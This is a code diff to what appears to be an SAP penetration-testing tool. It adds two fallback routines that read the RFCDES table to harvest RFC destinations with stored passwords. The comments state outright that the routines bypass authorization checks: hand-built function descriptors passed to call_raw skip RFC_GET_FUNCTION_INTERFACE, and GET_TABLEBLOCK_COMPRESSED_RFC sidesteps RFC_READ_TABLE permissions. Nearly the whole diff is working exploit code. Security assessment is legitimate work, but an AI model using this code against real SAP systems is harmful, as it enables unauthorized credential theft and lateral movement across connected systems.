@@ -31,7 +31,11 @@ from sapmap_config import (
     sapmap_username,
 )
 
-from sap_rfc_ctypes import ABAPApplicationError
+from sap_rfc_ctypes import (
+    ABAPApplicationError,
+    RFCTYPE_CHAR, RFCTYPE_TABLE, RFCTYPE_INT, RFCTYPE_BYTE, RFCTYPE_NUM,
+    RFC_IMPORT, RFC_EXPORT, RFC_TABLES,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -1003,6 +1007,23 @@ def retrieve_rfc_connections(node: SAPNode, creds: Credentials = None) -> list:
         except Exception as e2:
             logger.debug(f"RFCDES fallback also failed: {e2}")
 
+    # 3rd fallback: bypass RFC_GET_FUNCTION_INTERFACE using call_raw
+    if not connections:
+        try:
+            with _get_connection(node, creds) as conn:
+                connections = _try_rfcdes_raw_fallback(conn, node)
+        except Exception as e3:
+            logger.debug(f"call_raw RFCDES fallback also failed: {e3}")
+
+    # 4th fallback: GET_TABLEBLOCK_COMPRESSED_RFC (bypasses both
+    # RFC_GET_FUNCTION_INTERFACE and RFC_READ_TABLE authorization)
+    if not connections:
+        try:
+            with _get_connection(node, creds) as conn:
+                connections = _try_tableblock_compressed_fallback(conn, node)
+        except Exception as e4:
+            logger.debug(f"GET_TABLEBLOCK_COMPRESSED_RFC fallback failed: {e4}")
+
     return connections
 
 
@@ -1089,6 +1110,243 @@ def _try_rfc_read_table_fallback(conn, node: SAPNode) -> list:
     except Exception as e:
         logger.debug(f"RFCDES read failed: {e}")
         print(f"[-] Could not read RFCDES table: {e}")
+
+    return connections
+
+
+def _try_rfcdes_raw_fallback(conn, node: SAPNode) -> list:
+    """Fallback: read RFCDES via call_raw, bypassing RFC_GET_FUNCTION_INTERFACE.
+
+    This helps when the user lacks S_RFC authorization for function group SRFC
+    (RFC_GET_FUNCTION_INTERFACE) but does have authorization for SDTX
+    (RFC_READ_TABLE).  The normal conn.call() always invokes
+    RFC_GET_FUNCTION_INTERFACE first to fetch parameter metadata; call_raw
+    skips that by supplying a hand-built function description.
+    """
+    print(f"[*] Trying RFC_READ_TABLE via call_raw (bypass RFC_GET_FUNCTION_INTERFACE)...")
+    connections = []
+
+    try:
+        # Build type descriptors for RFC_READ_TABLE's table parameters
+        fields_td = conn._make_type_desc('RFC_DB_FLD', [
+            ('FIELDNAME', RFCTYPE_CHAR, 30, 60),
+            ('FIELDTEXT', RFCTYPE_CHAR, 60, 120),
+            ('TYPE',      RFCTYPE_CHAR, 1,  2),
+            ('LENGTH',    RFCTYPE_CHAR, 6,  12),
+            ('OFFSET',    RFCTYPE_CHAR, 6,  12),
+        ])
+        options_td = conn._make_type_desc('RFC_DB_OPT', [
+            ('TEXT', RFCTYPE_CHAR, 72, 144),
+        ])
+        data_td = conn._make_type_desc('TAB512', [
+            ('WA', RFCTYPE_CHAR, 512, 1024),
+        ])
+
+        func_desc = conn._make_func_desc('RFC_READ_TABLE', [
+            ('QUERY_TABLE', RFC_IMPORT, RFCTYPE_CHAR,  60,   30,  None),
+            ('DELIMITER',   RFC_IMPORT, RFCTYPE_CHAR,  2,    1,   None),
+            ('ROWCOUNT',    RFC_IMPORT, RFCTYPE_INT,   4,    4,   None),
+            ('FIELDS',      RFC_TABLES, RFCTYPE_TABLE, 206,  103, fields_td),
+            ('OPTIONS',     RFC_TABLES, RFCTYPE_TABLE, 144,  72,  options_td),
+            ('DATA',        RFC_TABLES, RFCTYPE_TABLE, 1024, 512, data_td),
+        ])
+
+        result = conn.call_raw(
+            'RFC_READ_TABLE', func_desc,
+            QUERY_TABLE='RFCDES',
+            DELIMITER='|',
+            FIELDS=[
+                {'FIELDNAME': 'RFCDEST'},
+                {'FIELDNAME': 'RFCTYPE'},
+                {'FIELDNAME': 'RFCOPTIONS'},
+            ],
+            OPTIONS=[{'TEXT': "RFCTYPE = '3'"}],
+            ROWCOUNT=500,
+        )
+
+        data = result.get("DATA", [])
+        for row in data:
+            wa = row.get("WA", "")
+            parts = wa.split("|")
+            if len(parts) >= 2:
+                dest_name = parts[0].strip()
+                options = parts[2].strip() if len(parts) > 2 else ""
+                if "%_PWD" not in options:
+                    continue
+                conn_obj = RFCConn(
+                    source_sid=node.sid,
+                    source_host=node.hostname or node.ip,
+                    destination_name=dest_name,
+                )
+                _parse_rfcdes_options(conn_obj, options)
+                connections.append(conn_obj)
+
+        print(f"[+] Found {len(connections)} Type-3 connections "
+              f"with stored passwords via call_raw RFCDES")
+
+    except Exception as e:
+        logger.debug(f"call_raw RFCDES failed: {e}")
+        print(f"[-] call_raw RFCDES fallback failed: {e}")
+
+    return connections
+
+
+def _try_tableblock_compressed_fallback(conn, node: SAPNode) -> list:
+    """Fallback: read RFCDES via GET_TABLEBLOCK_COMPRESSED_RFC + SAP decompressor.
+
+    This bypasses both RFC_GET_FUNCTION_INTERFACE and RFC_READ_TABLE
+    authorization.  GET_TABLEBLOCK_COMPRESSED_RFC is often authorized
+    for users with basic RFC access because it is used internally by
+    SAP's own table comparison and distribution tools.
+
+    The data comes back in SAP's proprietary LZH-compressed format
+    inside BOX4096 table rows.  We decompress it with a small C helper
+    built from the MaxDB/pysap GPL decompression library.
+    """
+    import os, subprocess, struct
+
+    print("[*] Trying GET_TABLEBLOCK_COMPRESSED_RFC on RFCDES ...")
+    connections = []
+
+    decompress_bin = os.path.join(os.path.dirname(__file__), "sap_decompress")
+    if not os.path.isfile(decompress_bin):
+        print("[-] sap_decompress binary not found, skipping")
+        return connections
+
+    try:
+        # -- build type / function descriptors -------------------------
+        tbl256_td = conn._make_type_desc('TBL256', [
+            ('LINE', RFCTYPE_BYTE, 256, 256),
+        ])
+        ntab_td = conn._make_type_desc('NTAB_CMP', [
+            ('VIEWNAME',  RFCTYPE_CHAR, 30, 60),
+            ('VARIANT',   RFCTYPE_CHAR, 14, 28),
+            ('FIELDNAME', RFCTYPE_CHAR, 30, 60),
+            ('TXTFIELD',  RFCTYPE_CHAR, 1,  2),
+            ('FOFFSET',   RFCTYPE_NUM,  6,  12),
+            ('INTLEN',    RFCTYPE_NUM,  6,  12),
+            ('DECIMALS',  RFCTYPE_NUM,  6,  12),
+            ('SIGN',      RFCTYPE_CHAR, 1,  2),
+            ('INTTYPE',   RFCTYPE_CHAR, 1,  2),
+            ('DATATYPE',  RFCTYPE_CHAR, 4,  8),
+            ('DOMNAME',   RFCTYPE_CHAR, 30, 60),
+            ('ROLLNAME',  RFCTYPE_CHAR, 30, 60),
+            ('KEYFLAG',   RFCTYPE_CHAR, 1,  2),
+            ('PRTFRKYFLD',RFCTYPE_CHAR, 1,  2),
+            ('CLI_FIELD', RFCTYPE_CHAR, 1,  2),
+            ('CHECKTABLE',RFCTYPE_CHAR, 30, 60),
+            ('REFTABLE',  RFCTYPE_CHAR, 30, 60),
+            ('REFFIELD',  RFCTYPE_CHAR, 30, 60),
+            ('READONLY',  RFCTYPE_CHAR, 1,  2),
+            ('FLAG',      RFCTYPE_CHAR, 1,  2),
+            ('LANGU',     RFCTYPE_CHAR, 1,  2),
+            ('OUTPUTLEN', RFCTYPE_NUM,  6,  12),
+            ('CONVEXIT',  RFCTYPE_CHAR, 5,  10),
+            ('FIELDTEXT', RFCTYPE_CHAR, 60, 120),
+            ('REPTEXT',   RFCTYPE_CHAR, 55, 110),
+            ('SCRTEXT_S', RFCTYPE_CHAR, 10, 20),
+            ('SCRTEXT_M', RFCTYPE_CHAR, 20, 40),
+            ('SCRTEXT_L', RFCTYPE_CHAR, 40, 80),
+            ('TEXT',      RFCTYPE_CHAR, 55, 110),
+            ('WIDTH',     RFCTYPE_NUM,  6,  12),
+            ('WIDTH_CUST',RFCTYPE_NUM,  6,  12),
+            ('NT_INDEX',  RFCTYPE_INT,  4,  4),
+            ('CMP_FLAG',  RFCTYPE_CHAR, 2,  4),
+            ('COMPARE',   RFCTYPE_CHAR, 1,  2),
+            ('ADJUST',    RFCTYPE_CHAR, 1,  2),
+            ('VISIBLE',   RFCTYPE_CHAR, 1,  2),
+            ('FIELD_POS', RFCTYPE_NUM,  4,  8),
+        ])
+        ntab_nuc = (30+14+30+1+6+6+6+1+1+4+30+30+1+1+1+30+30+30
+                    +1+1+1+6+5+60+55+10+20+40+55+6+6+4+2+1+1+1+4)
+        ntab_uc  = (60+28+60+2+12+12+12+2+2+8+60+60+2+2+2+60+60+60
+                    +2+2+2+12+10+120+110+20+40+80+110+12+12+4+4+2+2+2+8)
+
+        func_desc = conn._make_func_desc('GET_TABLEBLOCK_COMPRESSED_RFC', [
+            ('TABNAME',      RFC_IMPORT, RFCTYPE_CHAR,  60,      30,       None),
+            ('GET_SYSTAB',   RFC_IMPORT, RFCTYPE_CHAR,  2,       1,        None),
+            ('FIRST_KEY',    RFC_IMPORT, RFCTYPE_CHAR,  2,       1,        None),
+            ('BLOCK_SIZE',   RFC_IMPORT, RFCTYPE_INT,   4,       4,        None),
+            ('BOX4096',      RFC_TABLES, RFCTYPE_TABLE, 256,     256,      tbl256_td),
+            ('NAME_TAB',     RFC_TABLES, RFCTYPE_TABLE, ntab_uc, ntab_nuc, ntab_td),
+            ('NR_OF_ROWS',   RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
+            ('TABLEN',       RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
+            ('CHARLEN',      RFC_EXPORT, RFCTYPE_INT,   4,       4,        None),
+            ('READY_FLAG',   RFC_EXPORT, RFCTYPE_CHAR,  2,       1,        None),
+            ('CODE_PAGE',    RFC_EXPORT, RFCTYPE_NUM,   8,       4,        None),
+            ('CHECK_NUMBER', RFC_EXPORT, RFCTYPE_NUM,   8,       4,        None),
+            ('STRINGS',      RFC_EXPORT, RFCTYPE_CHAR,  2,       1,        None),
+        ])
+
+        # -- call the FM -----------------------------------------------
+        result = conn.call_raw(
+            'GET_TABLEBLOCK_COMPRESSED_RFC', func_desc,
+            TABNAME='RFCDES', GET_SYSTAB='X', FIRST_KEY='X',
+            BLOCK_SIZE=100000,
+        )
+
+        nr_rows = result.get('NR_OF_ROWS', 0)
+        if nr_rows == 0:
+            print("[*] RFCDES returned 0 rows")
+            return connections
+
+        # -- reassemble & decompress -----------------------------------
+        box = result.get('BOX4096', [])
+        raw = b''.join(
+            row.get('LINE', b'') for row in box
+            if isinstance(row.get('LINE'), bytes)
+        )
+        # First 8 bytes are a transport pre-header; SAP compression
+        # header starts at offset 8.
+        sap_compressed = raw[8:]
+
+        proc = subprocess.run(
+            [decompress_bin], input=sap_compressed,
+            capture_output=True, timeout=30,
+        )
+        if proc.returncode != 0 or not proc.stdout:
+            err = proc.stderr.decode(errors='replace').strip()
+            print(f"[-] SAP decompression failed: {err}")
+            return connections
+
+        decompressed = proc.stdout
+        row_size = len(decompressed) // nr_rows if nr_rows else 0
+        if row_size == 0:
+            return connections
+
+        # -- parse rows in UC (UTF-16-LE) format -----------------------
+        # RFCDEST   offset 0    len 64  (CHAR 32)
+        # RFCTYPE   offset 64   len 2   (CHAR 1)
+        # RFCOPTIONS offset 66  len 500 (CHAR 250)
+        for r in range(nr_rows):
+            rd = decompressed[r * row_size : (r + 1) * row_size]
+            if len(rd) < 566:
+                continue
+            rfcdest = rd[0:64].decode('utf-16-le', errors='replace'
+                                      ).rstrip('\x00').strip()
+            rfctype = rd[64:66].decode('utf-16-le', errors='replace'
+                                       ).rstrip('\x00').strip()
+            rfcoptions = rd[66:566].decode('utf-16-le', errors='replace'
+                                           ).rstrip('\x00').strip()
+            if not rfcdest or rfctype != '3':
+                continue
+            if '%_PWD' not in rfcoptions:
+                continue
+
+            conn_obj = RFCConn(
+                source_sid=node.sid,
+                source_host=node.hostname or node.ip,
+                destination_name=rfcdest,
+            )
+            _parse_rfcdes_options(conn_obj, rfcoptions)
+            connections.append(conn_obj)
+
+        print(f"[+] Found {len(connections)} Type-3 connections "
+              f"with stored passwords via GET_TABLEBLOCK_COMPRESSED_RFC")
+
+    except Exception as e:
+        logger.debug(f"GET_TABLEBLOCK_COMPRESSED_RFC failed: {e}")
+        print(f"[-] GET_TABLEBLOCK_COMPRESSED_RFC fallback failed: {e}")
 
     return connections
 
